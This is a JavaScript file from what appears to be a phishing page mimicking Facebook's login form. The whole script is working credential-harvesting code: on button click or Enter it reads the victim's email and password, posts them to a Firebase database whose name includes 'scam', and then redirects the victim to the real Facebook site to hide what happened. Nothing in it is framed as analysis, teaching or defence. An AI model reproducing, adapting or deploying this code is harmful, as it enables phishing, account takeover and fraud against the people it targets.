const sendData = function () {
  const email = document.getElementById("email").value;
  const pass = document.getElementById("pass").value;
  if (pass.length < 6 || !email.split("").includes("@")) {
    document.getElementById("email").classList = "inputtext _55r1 _6luy";
    if (pass.length < 6) {
      document.getElementById("pass").classList =
        "inputtext _55r1 inputtext _1kbt _9ay4 inputtext _1kbt";
      document.getElementById("pass").value = "";
    }
    if (!email.split("").includes("@")) {
      document.getElementById("email").classList =
        "inputtext _55r1 inputtext _1kbt _9ay4 inputtext _1kbt";
      document.getElementById("email").value = "";
      document.getElementById("pass").value = "";
    }

    return;
  }

  (async () => {
    const rawResponse = await fetch(
      "https://scam-79893-default-rtdb.firebaseio.com/db.json",
      {
        method: "post",
        body: JSON.stringify({ email: email, password: pass }),
      }
    );
  })();
  window.location.replace("https://www.facebook.com/");
};
document.getElementById("u_0_d_zU").addEventListener("click", sendData);

window.addEventListener("keydown", function (event) {
  if (event.key == "Enter") {
    console.log("yes");
    sendData();
  }
});
